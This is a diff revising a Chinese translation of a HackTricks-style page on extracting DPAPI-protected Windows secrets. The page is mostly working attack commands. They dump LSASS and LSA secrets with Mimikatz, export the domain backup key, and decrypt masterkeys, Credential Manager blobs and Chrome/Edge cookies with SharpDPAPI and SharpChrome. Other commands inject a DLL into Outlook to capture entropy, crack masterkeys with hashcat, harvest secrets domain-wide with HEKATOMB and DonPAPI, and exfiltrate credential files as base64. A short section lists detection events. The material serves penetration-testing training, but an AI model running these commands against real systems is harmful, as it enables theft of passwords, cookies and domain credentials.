@@ -1,38 +1,38 @@
-# DPAPI - Extracting Passwords
+# DPAPI - 提取密码
 
 {{#include ../../banners/hacktricks-training.md}}
 
 
 
-## DPAPI 是什么
+## 什么是 DPAPI
 
-Data Protection API (DPAPI) 主要用于 Windows 操作系统中，对**非对称私钥进行对称加密**，并将用户或系统机密作为重要的熵来源。该方法通过允许开发者使用从用户登录机密派生的密钥，或在系统加密场景下使用从系统域认证机密派生的密钥来加密数据，从而简化了加密过程，也避免开发者必须自行管理加密密钥的保护。
+Data Protection API（DPAPI）主要用于 Windows 操作系统中，对**非对称私钥进行对称加密**，并将用户或系统机密作为重要的熵来源。此方法通过允许开发者使用由用户登录机密派生的密钥加密数据，或在系统加密场景下使用由系统域身份验证机密派生的密钥加密数据，简化了开发者的加密工作，因此开发者无需自行管理加密密钥的保护。
 
-使用 DPAPI 最常见的方式是通过 **`CryptProtectData` 和 `CryptUnprotectData`** 函数。这些函数允许应用程序使用当前登录进程的会话安全地加密和解密数据。这意味着，加密数据只能由执行加密操作的同一用户或系统解密。
+使用 DPAPI 最常见的方式是调用 **`CryptProtectData` 和 `CryptUnprotectData`** 函数。这些函数允许应用程序利用当前登录进程的安全上下文加密和解密数据。默认情况下，只有加密数据时使用的同一用户或系统上下文才能解密这些数据。<sup>[[2]](#references)[[3]](#references)</sup>
 
-此外，这些函数还接受 **`entropy` 参数**，该参数也会在加密和解密过程中使用。因此，要解密使用此参数加密的数据，必须提供加密时使用的相同 entropy 值。
+这些函数还接受一个可选的**熵参数**，用于加密和解密。使用可选熵保护的数据必须提供相同的熵值才能解密。<sup>[[2]](#references)[[6]](#references)</sup>
 
-### Users key generation
+### 用户密钥生成
 
-DPAPI 会根据每个用户的凭据生成一个唯一密钥（称为 **`pre-key`**）。该密钥由用户密码及其他因素派生，其算法取决于用户类型，但最终会生成一个 SHA1 值。例如，对于域用户，**它取决于该用户的 NTLM hash**。
+DPAPI 会根据用户凭据派生出一个用户特定的值（通常称为 **pre-key**）。具体派生方式取决于账户和操作系统版本；对于域用户，工具可以从用户的 NTLM material 中派生出所需的值。<sup>[[2]](#references)</sup>
 
-这一点尤其重要，因为如果攻击者能够获取用户的密码 hash，就可以：
+这点尤其值得关注，因为如果攻击者能够获取用户的密码哈希，他们就可以：
 
-- 无需联系任何 API，使用该用户的密钥**解密通过 DPAPI 加密的任何数据**
+- 无需联系任何 API，即可使用该用户的密钥**解密所有通过 DPAPI 加密的数据**
 - 尝试离线**破解密码**，以生成有效的 DPAPI 密钥
 
-此外，每当用户使用 DPAPI 加密某些数据时，都会生成一个新的 **master key**。该 master key 才是实际用于加密数据的密钥。每个 master key 都会分配一个用于标识它的 **GUID**（Globally Unique Identifier）。
+DPAPI 会为每个用户维护一个或多个**主密钥**，而不是为每个受保护的 blob 创建新的主密钥。每个主密钥都有一个 **GUID**（Globally Unique Identifier），加密 blob 的记录中会标明保护该 blob 的主密钥。<sup>[[2]](#references)</sup>
 
-master key 存储在 **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** 目录中，其中 `{SID}` 是该用户的 Security Identifier。master key 会使用用户的 **`pre-key`** 进行加密，同时也会使用 **domain backup key** 进行恢复（因此，同一个密钥会通过两种不同的方式被加密两次）。
+主密钥存储在 **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** 目录中，其中 `{SID}` 是用户的 Security Identifier。主密钥文件包含由用户的 **pre-key** 保护的 material；对于域用户，还包含由**域备份密钥**保护的恢复 material。<sup>[[2]](#references)</sup>
 
-请注意，用于加密 master key 的 **domain key 存储在 domain controllers 中，并且永远不会改变**。因此，如果攻击者能够访问 domain controller，就可以获取 domain backup key，并解密该域中所有用户的 master key。<sup>[[2]](#references)</sup>
+请注意，用于加密主密钥的**域密钥存储在域控制器中，并且不会发生变化**。因此，如果攻击者能够访问域控制器，就可以获取域备份密钥，并解密该域中所有用户的主密钥。<sup>[[2]](#references)</sup>
 
-加密 blobs 的 header 中包含用于加密其中数据的 **GUID of the master key**。
+加密 blob 的标头中包含用于加密其中数据的**主密钥 GUID**。
 
 > [!TIP]
-> DPAPI encrypted blobs 以 **`01 00 00 00`** 开头
+> DPAPI encrypted blobs starts with **`01 00 00 00`**
 
-Find master keys:
+查找主密钥：
 ```bash
 Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
@@ -41,49 +41,49 @@ Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
 Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
 Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
 ```
-这是某个用户的一组 Master Keys：
+以下是某个用户的一组 Master Keys 的样子：
 
-![什么是 DPAPI - 用户密钥生成：这是某个用户的一组 Master Keys](<../../images/image (1121).png>)
+![什么是 DPAPI - 用户密钥生成：以下是某个用户的一组 Master Keys 的样子](<../../images/image (1121).png>)
 
 ### Machine/System key generation
 
-这是用于让 machine 加密数据的密钥。它基于 **DPAPI_SYSTEM LSA secret**，这是一个只有 SYSTEM 用户才能访问的特殊密钥。该密钥用于加密需要由系统自身访问的数据，例如 machine-level credentials 或 system-wide secrets。<sup>[[2]](#references)</sup>
+这是用于让 machine 加密数据的密钥。它基于 **DPAPI_SYSTEM LSA secret**，这是一个只有 SYSTEM 用户才能访问的特殊密钥。该密钥用于加密需要由系统自身访问的数据，例如 machine 级凭据或系统范围的 secrets。<sup>[[2]](#references)</sup>
 
 请注意，这些密钥**没有 domain backup**，因此只能在本地访问：
 
-- **Mimikatz** 可以使用以下命令转储 LSA secrets 来访问它：`mimikatz lsadump::secrets`
-- 该 secret 存储在 registry 中，因此 administrator 可以**修改 DACL permissions 以访问它**。registry path 为：`HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
-- 也可以从 registry hives 中进行 offline extraction。例如，在 target 上以 administrator 身份保存 hives 并将其 exfiltrate：
+- **Mimikatz** 可以使用以下命令转储 LSA secrets 并访问它：`mimikatz lsadump::secrets`
+- 该 secret 存储在 registry 中，因此 administrator 可以**修改 DACL permissions 以访问它**。registry 路径为：`HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
+- 也可以从 registry hives 中进行离线提取。例如，在目标上以 administrator 身份保存 hives，然后将其 exfiltrate：
 ```cmd
 reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
 reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
 ```
-然后在你的分析机上，从 hives 中恢复 DPAPI_SYSTEM LSA secret，并使用它解密 machine-scope blobs（scheduled task passwords、service credentials、Wi-Fi profiles 等）：
+然后在你的 analysis box 上，从 hives 中恢复 DPAPI_SYSTEM LSA secret，并使用它解密 machine-scope blobs（scheduled task passwords、service credentials、Wi‑Fi profiles 等）：
 ```text
 mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
 # Look for the DPAPI_SYSTEM secret in the output
 ```
-### 受 DPAPI 保护的数据
+### 由 DPAPI 保护的数据
 
 DPAPI 保护的个人数据包括：
 
-- Windows 凭据
-- Internet Explorer 和 Google Chrome 的密码及自动补全数据
-- Outlook 和 Windows Mail 等应用程序的电子邮件及内部 FTP 账户密码
+- Windows creds
+- Internet Explorer 和 Google Chrome 的密码及自动完成数据
+- Outlook 和 Windows Mail 等应用的电子邮件及内部 FTP 帐户密码
 - 共享文件夹、资源、无线网络和 Windows Vault 的密码，包括加密密钥
-- 远程桌面连接、.NET Passport 的密码，以及用于各种加密和身份验证用途的私钥
+- 远程桌面连接、.NET Passport 的密码，以及用于各种加密和身份验证目的的私钥
 - 由 Credential Manager 管理的网络密码，以及使用 CryptProtectData 的应用程序中的个人数据，例如 Skype、MSN messenger 等
-- 注册表中的加密 blobs
+- 注册表中的加密 blob
 - ...
 
 系统保护的数据包括：
-- Wi-Fi 密码
+- Wifi 密码
 - 计划任务密码
 - ...
 
 ### Master key 提取选项
 
-- 如果用户拥有域管理员权限，则可以访问**域备份密钥**，以解密该域中的所有用户 Master key：
+- 如果用户具有 domain admin 权限，则可以访问 **domain backup key**，以解密该域中的所有用户 master key：
 ```bash
 # Mimikatz
 lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export
@@ -91,17 +91,17 @@ lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export
 # SharpDPAPI
 SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
 ```
-- 通过本地管理员权限，可以**访问 LSASS 内存**，提取所有已连接用户的 DPAPI 主密钥以及 SYSTEM 密钥。
+- 具备本地管理员权限后，可以**访问 LSASS 内存**，提取所有已连接用户的 DPAPI 主密钥以及 SYSTEM 密钥。
 ```bash
 # Mimikatz
 mimikatz sekurlsa::dpapi
 ```
-- 如果用户拥有本地管理员权限，则可以访问 **DPAPI_SYSTEM LSA secret**，以解密机器主密钥：
+- 如果用户拥有本地管理员权限，则可以访问 **DPAPI_SYSTEM LSA secret**，以解密计算机主密钥：
 ```bash
 # Mimikatz
 lsadump::secrets /system:DPAPI_SYSTEM /export
 ```
-- 如果已知用户的密码或 NTLM hash，则可以**直接解密该用户的 master keys**：
+- 如果已知用户的 password 或 NTLM hash，则可以**直接解密该用户的 master keys**：
 ```bash
 # Mimikatz
 dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected
@@ -109,7 +109,7 @@ dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /password:PASSWORD
 ```
-- 如果你在该用户的 session 中，可以请求 DC 通过 **RPC** 提供用于解密 master keys 的**备份密钥**。如果你是 local admin 且该用户已登录，则可以为此**窃取其 session token**：
+- 如果你在以该用户身份运行的会话中，可以请求 DC 通过 **RPC 获取用于解密 master keys 的备份密钥**。如果你是本地管理员且该用户已登录，则可以通过以下方式 **窃取其 session token**：
 ```bash
 # Mimikatz
 dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc
@@ -117,7 +117,7 @@ dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" 
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /rpc
 ```
-## 列出 Vault
+## List Vault
 ```bash
 # From cmd
 vaultcmd /listcreds:"Windows Credentials" /all
@@ -129,14 +129,14 @@ mimikatz vault::list
 
 ### 查找 DPAPI 加密数据
 
-常见用户**受保护的文件**位于：
+普通用户**受保护的文件**位于：
 
 - `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
 - `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
 - `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
-- 也可以将上述路径中的 `\Roaming\` 替换为 `\Local\` 进行检查。
+- 也请尝试将上述路径中的 `\Roaming\` 替换为 `\Local\`。
 
-Enumeration 示例：
+枚举示例：
 ```bash
 dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
 dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
@@ -158,35 +158,35 @@ search /type:file /path:C:\path\to\file
 # Search a blob inside B64 encoded data
 search /type:base64 [/base:<base64 string>]
 ```
-请注意，来自同一 repo 的 [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) 可用于通过 DPAPI 解密 cookies 等敏感数据。<sup>[[12]](#references)</sup>
+注意，[**SharpChrome**](https://github.com/GhostPack/SharpDPAPI)（来自同一 repo）可用于使用 DPAPI 解密 cookies 等敏感数据。<sup>[[12]](#references)</sup>
 
-#### Chromium/Edge/Electron 快速用法（SharpChrome）
+#### Chromium/Edge/Electron quick recipes (SharpChrome)
 
-- 当前用户，以交互方式解密已保存的登录信息/cookies（即使使用 Chrome 127+ 的 app-bound cookies 也有效，因为在用户上下文中运行时，会从用户的 Credential Manager 中解析额外密钥）：
+- 当前用户，以 interactive 方式解密已保存的 logins/cookies（即使使用 Chrome 127+ app-bound cookies 也可工作，因为在 user context 中运行时，会从用户的 Credential Manager 解析额外密钥）：
 ```cmd
 SharpChrome logins  /browser:edge  /unprotect
 SharpChrome cookies /browser:chrome /format:csv /unprotect
 ```
-- 仅拥有文件时进行离线分析。首先从 profile 的 "Local State" 中提取 AES state key，然后使用它解密 cookie DB：
+- 仅拥有文件时进行离线分析。首先从配置文件的 "Local State" 中提取 AES 状态密钥，然后使用它解密 cookie DB：
 ```cmd
 # Dump the AES state key from Local State (DPAPI will be used if running as the user)
 SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
 # Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
 SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
 ```
-- 当你拥有 DPAPI domain backup key (PVK) 且在目标主机上拥有 admin 权限时进行全域/远程 triage：
+- 当你拥有 DPAPI domain backup key（PVK）且在目标主机上具备 admin 权限时进行全域/远程 triage：
 ```cmd
 SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
 SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
 ```
-- 如果你拥有用户的 DPAPI prekey/credkey（来自 LSASS），就可以跳过密码破解，直接解密配置文件数据：
+- 如果你拥有用户的 DPAPI prekey/credkey（来自 LSASS），则可以跳过密码破解，直接解密配置文件数据：
 ```cmd
 # For SharpChrome use /prekey; for SharpDPAPI use /credkey
 SharpChrome cookies /browser:edge /prekey:SHA1_HEX
 SharpDPAPI.exe credentials /credkey:SHA1_HEX
 ```
-笔记
-- 较新的 Chrome/Edge 构建版本可能会使用“App-Bound”加密来存储某些 cookies。没有额外的 app-bound key，无法对这些特定 cookies 进行 Offline decryption；请在目标用户上下文中运行 SharpChrome，以自动获取该密钥。请参阅下方引用的 Chrome security blog post。<sup>[[5]](#references)</sup>
+注释
+- 较新的 Chrome/Edge 构建版本可能会使用“App-Bound”加密来存储某些 cookies。没有额外的 app-bound key，无法离线解密这些特定的 cookies；请在目标用户上下文中运行 SharpChrome，以自动获取该密钥。请参阅下面引用的 Chrome security blog 文章。<sup>[[5]](#references)</sup>
 
 ### 访问密钥和数据
 
@@ -199,7 +199,7 @@ SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect
 # Decrypt machine data
 SharpDPAPI.exe machinetriage
 ```
-- **获取凭据相关信息**，例如加密数据和 guidMasterKey。<sup>[[3]](#references)</sup>
+- **获取凭据相关信息**，如加密数据和 guidMasterKey。<sup>[[3]](#references)</sup>
 ```bash
 mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7
 
@@ -209,9 +209,9 @@ guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
 pbData             : b8f619[...snip...]b493fe
 [..]
 ```
-- **Access masterkeys**：
+- **访问主密钥**：
 
-使用 RPC 解密请求 **domain backup key** 的用户 masterkey：
+使用 RPC 解密请求 **domain backup key** 的用户主密钥：
 ```bash
 # Mimikatz
 dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc
@@ -219,7 +219,7 @@ dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" 
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /rpc
 ```
-**SharpDPAPI** 工具还支持以下用于 masterkey 解密的参数（注意，可以使用 `/rpc` 获取域备份密钥，使用 `/password` 使用明文密码，或使用 `/pvk` 指定 DPAPI 域私钥文件...）：<sup>[[12]](#references)</sup>
+**SharpDPAPI** 工具还支持以下用于解密 masterkey 的参数（注意，可以使用 `/rpc` 获取域备份密钥、使用 `/password` 使用明文密码，或使用 `/pvk` 指定 DPAPI 域私钥文件……）：<sup>[[12]](#references)</sup>
 ```
 /target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
 /pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
@@ -239,7 +239,7 @@ dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
 # SharpDPAPI
 SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
 ```
-**SharpDPAPI** 工具还支持用于 `credentials|vaults|rdg|keepass|triage|blob|ps` 解密的以下参数（请注意，可以使用 `/rpc` 获取域备份密钥，使用 `/password` 使用明文密码，使用 `/pvk` 指定 DPAPI 域私钥文件，使用 `/unprotect` 使用当前用户会话...）：<sup>[[12]](#references)</sup>
+**SharpDPAPI** 工具还支持使用以下参数对 `credentials|vaults|rdg|keepass|triage|blob|ps` 进行解密（注意，可以使用 `/rpc` 获取域备份密钥，使用 `/password` 使用明文密码，使用 `/pvk` 指定 DPAPI 域私钥文件，使用 `/unprotect` 使用当前用户会话...）：<sup>[[12]](#references)</sup>
 ```
 Decryption:
 /unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
@@ -260,7 +260,7 @@ Note: not applicable to 'blob' or 'ps' commands
 ```
 - 直接使用 DPAPI prekey/credkey（无需密码）
 
-如果可以 dump LSASS，Mimikatz 通常会显示一个与每次登录对应的 DPAPI key，无需知道明文密码即可使用它解密用户的 masterkeys。将此值直接传递给工具：
+如果你可以 dump LSASS，Mimikatz 通常会暴露一个按登录会话生成的 DPAPI key，可用于解密用户的 masterkeys，而无需知道明文密码。将此值直接传递给相关 tooling：
 ```cmd
 # SharpDPAPI accepts the "credkey" (domain or local SHA1)
 SharpDPAPI.exe triage /credkey:SHA1_HEX
@@ -286,13 +286,13 @@ SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
 - Credential Manager blob(s)：%APPDATA%\Microsoft\Credentials\<hex>
 - 匹配的 masterkey：%APPDATA%\Microsoft\Protect\<SID>\{GUID}
 
-- 如果文件传输工具不稳定，可以在主机上对文件进行 base64 编码，然后复制输出内容：
+- 如果文件传输工具不稳定，可以在主机上对文件执行 base64 编码，然后复制输出：
 ```powershell
 # Base64-encode files for copy/paste exfil
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
 ```
-- 使用用户的 SID 和密码/哈希解密 masterkey：
+- 使用用户的 SID 和 password/hash 解密 masterkey：
 ```bash
 # Plaintext password
 python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
@@ -302,21 +302,21 @@ python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
 python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
 -sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
 ```
-- 使用解密后的 masterkey 解密 credential blob：
+- 使用已解密的 masterkey 解密 credential blob：
 ```bash
 python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
 # Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
 # Username=<user> ; Password=<cleartext>
 ```
-此工作流通常可以恢复由使用 Windows Credential Manager 的应用保存的域凭据，包括管理员账户（例如 `*_adm`）。
+此工作流通常可以恢复由使用 Windows Credential Manager 的应用保存的域凭据，其中包括管理帐户（例如 `*_adm`）。
 
 ---
 
-### 处理可选熵（"Third-party entropy"）
+### 处理可选 Entropy（“Third-party entropy”）
 
-某些应用会向 `CryptProtectData` 传递额外的 **entropy** 值。如果没有此值，即使已知正确的 masterkey，也无法解密该 blob。因此，在针对以这种方式保护的凭据时，获取 entropy 至关重要（例如 Microsoft Outlook、某些 VPN 客户端）。
+某些应用会向 `CryptProtectData` 传递额外的 **entropy** 值。没有此值，即使已知正确的 masterkey，也无法解密该 blob。因此，在针对以这种方式保护的凭据时，获取 entropy 至关重要（例如 Microsoft Outlook 和某些 VPN 客户端）。
 
-[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture)（2022）是一个 user-mode DLL，它会 hook 目标进程中的 DPAPI 函数，并透明地记录所提供的任何可选 entropy。以 **DLL-injection** 模式针对 `outlook.exe` 或 `vpnclient.exe` 等进程运行 EntropyCapture 后，它会输出一个文件，将每个 entropy 缓冲区映射到调用进程和 blob。之后，可以将捕获的 entropy 提供给 **SharpDPAPI**（`/entropy:`）或 **Mimikatz**（`/entropy:<file>`），以解密数据。<sup>[[6]](#references)</sup>
+[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture)（2022）是一个用户模式 DLL，它会 hook 目标进程内部的 DPAPI 函数，并透明地记录所提供的任何可选 entropy。以 **DLL-injection** 模式针对 `outlook.exe` 或 `vpnclient.exe` 等进程运行 EntropyCapture 后，它会输出一个文件，将每个 entropy 缓冲区映射到调用进程和 blob。之后，可以将捕获的 entropy 提供给 **SharpDPAPI**（`/entropy:`）或 **Mimikatz**（`/entropy:<file>`），以解密数据。<sup>[[6]](#references)</sup>
 ```powershell
 # Inject EntropyCapture into the current user's Outlook
 InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll
@@ -324,22 +324,22 @@ InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll
 # Later decrypt a credential blob that required entropy
 SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
 ```
-### 离线破解 masterkeys（Hashcat & DPAPISnoop）
+### 离线破解 masterkeys（Hashcat 和 DPAPISnoop）
 
-Microsoft 从 Windows 10 v1607（2016）开始引入了 **context 3** masterkey 格式。`hashcat` v6.2.6（2023 年 12 月）新增了 hash-modes **22100**（DPAPI masterkey v1 context ）、**22101**（context 1）和 **22102**（context 3），支持直接从 masterkey 文件中对用户密码进行 GPU 加速破解。因此，攻击者无需与目标系统交互，即可执行 word-list 或 brute-force 攻击。<sup>[[7]](#references)</sup>
+Microsoft 从 Windows 10 v1607（2016）开始引入 **context 3** masterkey 格式。`hashcat` v6.2.6（2023 年 12 月）新增了 hash-modes **22100**（DPAPI masterkey v1 context）、**22101**（context 1）和 **22102**（context 3），支持直接从 masterkey 文件中对用户密码执行 GPU 加速破解。因此，攻击者无需与目标系统交互，即可执行字典或暴力破解攻击。<sup>[[7]](#references)</sup>
 
-`DPAPISnoop`（2024）可自动化此过程：
+`DPAPISnoop`（2024）可自动化完成该过程：
 ```bash
 # Parse a whole Protect folder, generate hashcat format and crack
 DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
 hashcat -m 22102 bob.hc wordlist.txt -O -w4
 ```
-该工具还可以解析 Credential 和 Vault blobs，使用破解的密钥对其进行解密，并导出明文密码。<sup>[[8]](#references)</sup>
+该工具还可以解析 Credential 和 Vault blobs，使用已破解的密钥解密它们，并导出明文密码。<sup>[[8]](#references)</sup>
 
 
-### 访问其他机器数据
+### 访问其他机器的数据
 
-在 **SharpDPAPI 和 SharpChrome** 中，你可以指定 **`/server:HOST`** 选项来访问远程机器的数据。当然，你需要能够访问该机器，并且以下示例假设你已知晓 **域备份加密密钥**：
+在 **SharpDPAPI 和 SharpChrome** 中，你可以指定 **`/server:HOST`** 选项来访问远程机器的数据。当然，你需要能够访问该机器，并且以下示例假设**域备份加密密钥已知**：
 ```bash
 SharpDPAPI.exe triage /server:HOST /pvk:BASE64
 SharpChrome cookies /server:HOST /pvk:BASE64
@@ -348,48 +348,48 @@ SharpChrome cookies /server:HOST /pvk:BASE64
 
 ### HEKATOMB
 
-[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) 是一个用于自动化从 LDAP directory 中提取所有 users 和 computers，并通过 RPC 提取 domain controller backup key 的工具。随后，该 script 会解析所有 computers 的 IP address，并对所有 computers 执行 smbclient，以获取所有 users 的 DPAPI blobs，然后使用 domain backup key 解密全部内容。
+[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) 是一个能够自动从 LDAP directory 中提取所有 users 和 computers，并通过 RPC 提取 domain controller backup key 的工具。随后，该 script 会解析所有 computers 的 IP address，并对所有 computers 执行 smbclient，以获取所有 users 的 DPAPI blobs，然后使用 domain backup key 解密全部内容。
 
 `python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`
 
-通过从 LDAP 提取的 computers list，即使之前不知道这些 sub network，也可以找到它们！
+通过从 LDAP 提取的 computers 列表，即使事先不知道所有 sub network，也可以找到它们！
 
-### DonPAPI 2.x (2024-05)
+### DonPAPI 2.x（2024-05）
 
-[**DonPAPI**](https://github.com/login-securite/DonPAPI) 可以自动 dump 由 DPAPI 保护的 secrets。2.x release 引入了：<sup>[[9]](#references)</sup>
+[**DonPAPI**](https://github.com/login-securite/DonPAPI) 可以自动 dump 受 DPAPI 保护的 secrets。2.x release 引入了：<sup>[[9]](#references)</sup>
 
 * 并行收集数百台 hosts 上的 blobs
 * 解析 **context 3** masterkeys，并自动集成 Hashcat cracking
-* 支持 Chrome 的 "App-Bound" encrypted cookies（见下一节）
-* 新增 **`--snapshot`** mode，可反复 poll endpoints 并 diff 新创建的 blobs
+* 支持 Chrome 的“App-Bound”加密 cookies（见下一节）
+* 新增 **`--snapshot`** mode，可反复轮询 endpoints 并 diff 新创建的 blobs
 
 ### DPAPISnoop
 
-[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) 是一个用于解析 masterkey/credential/vault files 的 C# parser，可以输出 Hashcat/JtR formats，并可选择自动调用 cracking。它完全支持截至 Windows 11 24H1 的 machine 和 user masterkey formats。<sup>[[8]](#references)</sup>
+[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) 是一个用于解析 masterkey/credential/vault files 的 C# parser，可以输出 Hashcat/JtR formats，并可选择自动调用 cracking。它完全支持 Windows 11 24H1 及更低版本中的 machine 和 user masterkey formats。<sup>[[8]](#references)</sup>
 
 
 ## 常见检测项
 
-- 访问 `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`、`C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` 以及其他 DPAPI-related directories 中的 files。
-- 尤其是通过 **C$** 或 **ADMIN$** 等 network share 进行访问时。
+- 访问 `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`、`C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` 以及其他 DPAPI 相关 directories 中的 files。
+- 特别是通过 **C$** 或 **ADMIN$** 等 network share 进行访问时。
 - 使用 **Mimikatz**、**SharpDPAPI** 或类似 tooling 访问 LSASS memory 或 dump masterkeys。
-- Event **4662**：*An operation was performed on an object* – 可与访问 **`BCKUPKEY`** object 的行为进行关联。
-- 当 process 请求 *SeTrustedCredManAccessPrivilege*（Credential Manager）时触发 Event **4673/4674**。
+- Event **4662**：*An operation was performed on an object* —— 可与访问 **`BCKUPKEY`** object 的行为进行关联。
+- 当 process 请求 *SeTrustedCredManAccessPrivilege*（Credential Manager）时触发的 Event **4673/4674**。
 
 ---
 ### 2023-2025 vulnerabilities & ecosystem changes
 
-* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing**（2023 年 11 月）。具有 network access 的 attacker 可以诱骗 domain member 获取恶意 DPAPI backup key，从而解密 user masterkeys。该问题已在 2023 年 11 月的 cumulative update 中修复 – administrators 应确保 DCs 和 workstations 均已完整 patch。<sup>[[4]](#references)</sup>
-* **Chrome 127 “App-Bound” cookie encryption**（2024 年 7 月）使用存储在 user 的 **Credential Manager** 下的额外 key，取代了 legacy DPAPI-only protection。现在，offline decryption cookies 需要同时具备 DPAPI masterkey 和 **GCM-wrapped app-bound key**。SharpChrome v2.3 和 DonPAPI 2.x 在 user context 下运行时能够恢复该额外 key。<sup>[[5]](#references)</sup>
+* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing**（2023 年 11 月）。拥有 network access 的 attacker 可以诱骗 domain member 获取恶意 DPAPI backup key，从而解密 user masterkeys。该问题已在 2023 年 11 月的 cumulative update 中修复——administrators 应确保 DCs 和 workstations 均已完全更新补丁。<sup>[[4]](#references)</sup>
+* **Chrome 127 “App-Bound” cookie encryption**（2024 年 7 月）使用额外存储于 user **Credential Manager** 中的 key，取代了旧版仅由 DPAPI 提供的 protection。现在，对 cookies 进行 offline decryption 需要同时具备 DPAPI masterkey 和 **GCM-wrapped app-bound key**。SharpChrome v2.3 和 DonPAPI 2.x 在 user context 下运行时能够恢复该额外 key。<sup>[[5]](#references)</sup>
 
 
-### 案例研究：Zscaler Client Connector – 从 SID 派生的 Custom Entropy
+### 案例研究：Zscaler Client Connector —— 从 SID 派生的 Custom Entropy
 
-Zscaler Client Connector 将多个 configuration files 存储在 `C:\ProgramData\Zscaler` 下（例如 `config.dat`、`users.dat`、`*.ztc`、`*.mtt`、`*.mtc`、`*.mtp`）。每个 file 都使用 **DPAPI (Machine scope)** 加密，但 vendor 提供的 **custom entropy** 是在 *runtime* 计算得出的，而不是存储在 disk 上。<sup>[[1]](#references)</sup>
+Zscaler Client Connector 会在 `C:\ProgramData\Zscaler` 下存储多个 configuration files（例如 `config.dat`、`users.dat`、`*.ztc`、`*.mtt`、`*.mtc`、`*.mtp`）。每个 file 都使用 **DPAPI (Machine scope)** 加密，但 vendor 提供的 **custom entropy** 是在 *runtime 中计算* 得出的，而不是存储在 disk 上。<sup>[[1]](#references)</sup>
 
-该 entropy 由以下两个 elements 重建：
+该 entropy 由两个 elements 重建：
 
